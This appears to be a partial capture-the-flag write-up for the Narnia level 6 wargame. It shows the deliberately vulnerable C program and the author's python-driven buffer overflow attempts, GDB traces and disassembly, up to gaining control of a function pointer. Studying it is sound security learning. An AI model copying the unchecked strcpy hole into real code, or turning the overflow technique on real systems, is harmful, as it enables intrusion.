==================== Source ==============================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);

	exit(1);
}
=============================================================
I'm gonna try to overflow b2 
narnia6@narnia:~$ /narnia/narnia6 B1 B2                                          
B1
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*12')
AAAA
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*15')
AAAAAAA
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*16')
Segmentation fault (core dumped)

Oh! Let's fire up GDB

(gdb) run B1 $(python -c'print "A"*16')
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()
(gdb) run B1 $(python -c'print "A"*20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*20')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

Nice! Now, where to point?

Let's see where this is actually happening, after a bit of fiddling with gdb we get this:
0x08048558 in get_sp ()
(gdb) 
0x08048697 in main ()
(gdb) 
0x08048699 in main ()
(gdb) 
0x080486a7 in main ()
(gdb) 
0x080486ab in main ()
(gdb) 
0x080486ae in main ()
(gdb) 
0x080486b2 in main ()
(gdb) 
0x41414141 in ?? ()
(gdb) 

Corresponds to this:

 8048692:	e8 b6 fe ff ff       	call   804854d <get_sp>
 8048697:	39 c3                	cmp    %eax,%ebx
 8048699:	75 0c                	jne    80486a7 <main+0x14e>
 804869b:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
 80486a2:	e8 69 fd ff ff       	call   8048410 <exit@plt>
 80486a7:	8d 44 24 20          	lea    0x20(%esp),%eax
 80486ab:	89 04 24             	mov    %eax,(%esp)
 80486ae:	8b 44 24 28          	mov    0x28(%esp),%eax
 80486b2:	ff d0                	call   *%eax

